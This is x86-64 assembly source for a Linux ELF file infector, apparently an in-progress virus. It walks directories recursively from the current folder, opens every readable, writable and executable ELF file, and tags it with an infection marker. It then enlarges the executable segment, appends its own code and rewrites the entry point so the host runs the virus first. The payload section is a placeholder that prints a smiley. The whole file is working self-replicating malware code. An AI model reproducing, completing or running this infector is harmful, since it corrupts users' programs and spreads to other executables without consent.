global _start
section .text
default rel

; try not to go over 576 bytes
regular_program_address:
    mov rax, 0x3c
    xor rdi, rdi
    syscall

_start:
    ; enumerate all executable files we can find
    push rbp
    mov rbp, rsp
    sub rsp, 0x3
    mov word [rsp], "./"
    mov byte [rsp+2], 0
lsdirs:
    ; open /
    mov rax, 0x2 ; sys_open
    mov rdi, rsp
    mov rsi, dirflags
    xor rdx, rdx
    syscall

    ; skip on failure
    cmp rax, 0x0
    jl end

    push rax
    call lsdirents

    ; close /
    mov rax, 0x3 ; sys_close
    pop rdi
    syscall

    ; done
    jmp end

; LIBRARY SPACE -- not executed sequentially
strlen:
    xor rcx, rcx
strlen_loop:
    cmp byte [rax], 0x0
    jz strlen_done
    inc rax
    inc rcx
    jmp strlen_loop
strlen_done:
    ret

; TODO: actual surgery (will remove direntptr as argument)
; usage: push direntptr ; push fd ; call surgery
surgery:
    push rbp
    mov rbp, rsp

    ; test ELF header
    xor rax, rax
    mov qword rdi, [rbp+0x10]
    sub rsp, 0x4
    mov rsi, rsp
    mov rdx, 0x4
    syscall
    cmp dword [rsp], elf_header_le
    jne surgery_done
    add rsp, 0x4

    ; seek to e_shoff (8)
    mov rax, 0x8 ; sys_lseek
    mov rsi, 0x28 ; e_shoff
    xor rdx, rdx ; SEEK_SET
    syscall

    sub rsp, 0x8
    xor rax, rax ; sys_read
    mov rsi, rsp
    mov rdx, 0x8
    syscall

    ; magic to prevent us from double-infecting the same file
    mov rax, identifier
    cmp qword [rsp], rax
    je surgery_done
    ; set the identifier now
    mov qword [rsp], rax
    ; backtrack to e_shoff
    mov rax, 0x8 ; sys_lseek
    mov rsi, 0x28 ; e_shoff
    xor rdx, rdx ; seek_set
    syscall

    mov rax, 0x1 ; sys_write
    mov rsi, rsp
    mov rdx, 0x8
    syscall
    ; leave space for e_phnum (2)
    add rsp, 0x6

    ; seek to e_phnum (2)
    mov rax, 0x8
    mov rsi, 0x38
    xor rdx, rdx
    syscall

    ; stack : e_phnum | args
    xor rax, rax
    mov rsi, rsp
    mov rdx, 0x2
    syscall

    ; seek to e_phoff (8)
    mov rax, 0x8 ; sys_lseek
    mov rsi, 0x20 ; e_phoff
    xor rdx, rdx ; SEEK_SET
    syscall

    ; stack : e_phoff | e_phnum | args
    sub rsp, 0x8
    xor rax, rax ; sys_read
    mov rsi, rsp
    mov rdx, 0x8
    syscall

    ; seek to the value of e_phoff
    mov rax, 0x8 ; sys_lseek
    pop rsi
    xor rdx, rdx ; SEEK_SET
    syscall

search_text_seg:
    ; if e_phnum <= 0 nothing to infect
    cmp word [rsp], 0x0
    jle surgery_done

    ; read p_type (4)
    sub rsp, 0x4
    xor rax, rax ; sys_read
    mov rsi, rsp
    mov rdx, 0x4
    syscall

    mov rax, 0x4
    cmp dword [rsp], 0x1
    jne search_text_tail

    ; read p_flags (4)
    xor rax, rax
    syscall

    and dword [rsp], 0x1 ; PF_X
    jnz found_text_seg
    mov rax, 0x8

search_text_tail:
    ; clear buffer
    add rsp, 0x4
    ; decrement e_phnum
    dec word [rsp]
    ; seek to the next program header 
    mov rsi, phdrsz
    sub rsi, rax ; 4 or 8 depending where we jumped from
    mov rax, 0x8 ; sys_lseek
    mov rdx, 0x1 ; SEEK_CUR
    syscall

    jmp search_text_seg

found_text_seg:
    ; clear p_flags (4) and e_phnum (2) off stack and allocate 8 bytes
    ; stack : p_offset (8) | args
    sub rsp, 0x2

    ; rdi is now in front of p_offset (8) in the text segment entry
    xor rax, rax ; sys_read
    mov rsi, rsp
    mov rdx, 0x8
    syscall

    ; stack : p_vaddr (8) | p_offset (8) | args
    sub rsp, 0x8
    xor rax, rax
    mov rsi, rsp
    syscall

    ; seek to p_filesz (8)
    mov rax, 0x8 ; sys_lseek
    mov rsi, 0x8
    mov rdx, 0x1 ; SEEK_CUR
    syscall

    ; stack : p_filesz (8) | p_vaddr (8) | p_offset (8) | args
    sub rsp, 0x8
    xor rax, rax ; sys_read
    mov rsi, rsp
    mov rdx, 0x8
    syscall

    ; offset += existing program size
    mov qword rax, [rsp]
    add qword [rsp+0x10], rax
    ; program size += injection size
    add qword [rsp], selfsz
    
    ; backtrack to p_filesz (8)
    mov rax, 0x8 ; sys_lseek
    mov rsi, -0x8
    mov rdx, 0x1 ; SEEK_CUR
    syscall

    ; write out increased program size to p_filesz (8) and p_memsz (8)
    mov rax, 0x1 ; sys_write
    mov rsi, rsp
    mov rdx, 0x8
    syscall
    mov rax, 0x1 ; sys_write
    syscall

    ; find the program entry point
    mov rax, 0x8 ; sys_lseek
    mov rsi, 0x18 ; e_entry (8)
    xor rdx, rdx ; SEEK_SET
    syscall

    ; stack : e_entry (8) | p_filesz (8) | p_vaddr (8) | p_offset (8) | args
    sub rsp, 0x8
    xor rax, rax ; sys_read
    mov rsi, rsp
    mov rdx, 0x8
    syscall

write_out:
    ; seek to executable offset
    ; stack : e_entry (8) | p_filesz (8) | p_vaddr (8) | p_offset (8) | args
    mov rax, 0x8 ; sys_lseek
    mov qword rsi, [rsp+0x18] ; p_offset (8)
    xor rdx, rdx ; SEEK_SET
    syscall

    ; write ourselves out
    mov rax, 0x1 ; sys_write
    lea rsi, [rel _start]
    mov rdx, selfsz
    syscall

calc_jump:
    ; backtrack to the jump-out address
    mov rax, 0x8 ; sys_lseek
    mov rsi, jmploc
    mov rdx, 0x1 ; SEEK_CUR
    syscall

    ; calculate jump offset

    ; stack : e_entry (8) | p_filesz (8) | p_vaddr (8) | p_offset (8) | args
    mov qword rax, [rsp] ; e_entry (8)
    mov qword rbx, [rsp+0x10] ; p_vaddr (8)
    sub eax, ebx
    mov qword rbx, [rsp+0x8]
    sub eax, ebx ; eax = e_entry - (p_vaddr + program size)
    mov qword [rsp], rax
    sub rsp, 0x4
    mov dword [rsp], eax

    ; write out jump offset (4)
    mov rax, 0x1 ; sys_write
    mov rsi, rsp
    mov rdx, 0x4
    syscall
    add rsp, 0x4

alter_entry:
    ; calculate new entry point

    ; stack : e_entry (8) | p_filesz (8) | p_vaddr (8) | p_offset (8) | args
    mov qword rax, [rsp+0x10] ; p_vaddr (8)
    add qword rax, [rsp+0x8] ; p_filesz (8)
    sub qword rax, selfsz ; we added our own size to p_filesz earlier
    mov qword [rsp], rax

    ; seek to e_entry again
    mov rax, 0x8 ; sys_lseek
    mov rsi, 0x18 ; e_entry (8)
    xor rdx, rdx ; SEEK_SET
    syscall

    ; write new entry address
    mov rax, 0x1 ; sys_write
    mov rsi, rsp
    mov rdx, 0x8
    syscall

surgery_done:
    mov rsp, rbp
    pop rbp
    ret

; usage: push fd ; call lsdirents
; stack structure: rsp -> rbp | ret addr | dir fd
lsdirents:
    push rbp
    mov rbp, rsp

exterior_loop:
    mov qword rdi, [rbp+0x10] ; function arg: fd
    mov rax, 0xd9 ; sys_getdents64
    mov rdx, direntsz

    sub rsp, direntsz
    mov rsi, rsp
    syscall

    cmp rax, 0x0
    jle lsdirents_done
    mov rbx, rsi

; arguments: rax (size of structure), rbx (address of buffer)
interior_loop:
    push rax ; spill structure size

    xor rdx, rdx
    mov byte dl, [rbx+enttypeofs]
    cmp rdx, dirmode
    jne file_eligibility

    ; safety checks and such
    cmp byte [rbx+fnofs], 0x0
    je interior_loop_end

    cmp word [rbx+fnofs], "."
    je interior_loop_end

    cmp word [rbx+fnofs], ".."
    je interior_loop_end

recurse_on_dir:
    mov rax, 0x101 ; sys_openat
    mov qword rdi, [rbp+0x10] ; function arg: fd
    lea rsi, [rbx+fnofs]
    mov rdx, dirflags
    xor r10, r10
    syscall

    ; skip on open error
    cmp rax, 0x0
    jle interior_loop_end

    ; spill structure pointer
    push rbx
    ; pass fd arg
    push rax
    call lsdirents

    ; close the subservient file descriptor
    mov rax, 0x3 ; sys_close
    pop rdi
    syscall

    ; restore structure pointer
    pop rbx

    ; skip surgery on directories
    jmp interior_loop_end

file_eligibility:
    ; ignore links and sockets and weird stuff
    cmp byte [rbx+enttypeofs], filemode
    jne interior_loop_end

    ; test that the file can be read, written, and executed
    mov rax, 0x10d ; sys_faccessat
    mov qword rdi, [rbp+0x10]
    lea rsi, [rbx+fnofs]
    mov rdx, accessflags
    syscall
    test rax, rax
    jnz interior_loop_end

    mov rax, 0x101 ; sys_openat
    ; leave rdi and rsi from access call
    mov rdx, fileflags
    xor r10, r10
    syscall

    push rbx
    push rax
    call surgery
    
    ; close file
    mov rax, 0x3 ; sys_close
    pop rdi
    syscall
    ; restore structure pointer
    pop rbx

interior_loop_end:
    pop rax ; un-spill structure size
    xor rdx, rdx
    mov word dx, [rbx+entszofs]
    sub rax, rdx
    add rbx, rdx

    cmp rax, 0x0
    jle exterior_loop
    jmp interior_loop   

lsdirents_done:
    mov rsp, rbp
    pop rbp
    ret

end:
    ; TODO: this is where the payload goes
    ; between here
    mov rax, 0x1
    mov rdi, 0x1
    sub rsp, 0x4
    mov word [rsp], ":)"
    mov byte [rsp+2], 0xa
    mov byte [rsp+3], 0x0
    mov rsi, rsp
    mov rdx, 0x3
    syscall
    ; and here
    mov rsp, rbp
    pop rbp
    jmp regular_program_address

symbols:
    elf_header_le equ 0x464c457f
    elf_header_be equ 0x7f454c46
    direntsz equ 280
    fnofs equ 19
    entszofs equ 16
    enttypeofs equ 18
    dirmode equ 4
    filemode equ 8
    dirflags equ 0x10000 ; O_RDONLY | O_DIRECTORY
    fileflags equ 0x2 ; O_RDWR
    ; accessflags equ 0x6 ; R_OK | W_OK
    accessflags equ 0x7 ; R_OK | W_OK | X_OK
    phdrsz equ 0x38
    pgsz equ 0x1000
    memseg equ 0x1000
    selfsz equ symbols - _start
    jmploc equ -0x4
    identifier equ 0xc0def00d
